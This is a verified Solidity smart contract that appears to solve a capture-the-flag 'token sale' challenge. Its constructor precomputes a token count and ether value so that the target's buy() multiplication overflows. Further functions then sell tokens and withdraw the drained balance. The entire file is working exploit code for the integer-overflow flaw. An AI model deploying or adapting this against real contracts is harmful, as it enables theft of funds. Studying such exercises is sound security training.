/**
 *Submitted for verification at Etherscan.io on 2022-07-21
*/

pragma solidity ^0.4.21;

contract TokenSaleChallengeI {
    function isComplete() external view returns (bool);
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
}

contract CTFTokenSaleChallenge {
    uint256 public maxUint256 = 0;
    uint256 public eightyPow = 0;
    uint256 public sendToken = 0;
    uint256 public sendValue = 0;

    function CTFTokenSaleChallenge() {
        maxUint256 = 2 ** 256 - 1;
        eightyPow = 10 ** 18;

        sendToken = (maxUint256 / eightyPow) + 1;
        uint256 modvalue = maxUint256 % eightyPow;
        sendValue = eightyPow - modvalue - 1;
    }

    function getMax256() public view returns(uint256){
        return maxUint256;
    }

    function sendEther() public payable {
        require(msg.value == sendValue);
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function buyOvewrFlowIt(address _address) public payable {
        // require(msg.value == sendValue);
        
        TokenSaleChallengeI tokenInstance = TokenSaleChallengeI(_address);
        tokenInstance.buy.value(sendValue)(sendToken);
    }

    function sell(address _address, uint _value) public {
        TokenSaleChallengeI tokenInstance = TokenSaleChallengeI(_address);
        tokenInstance.sell(_value);
    }

    function hasComplete(address _address) public view returns(bool) {
        TokenSaleChallengeI tokenInstance = TokenSaleChallengeI(_address);
        bool cm = tokenInstance.isComplete();
        return cm;
    }

    function () public payable {

    }
}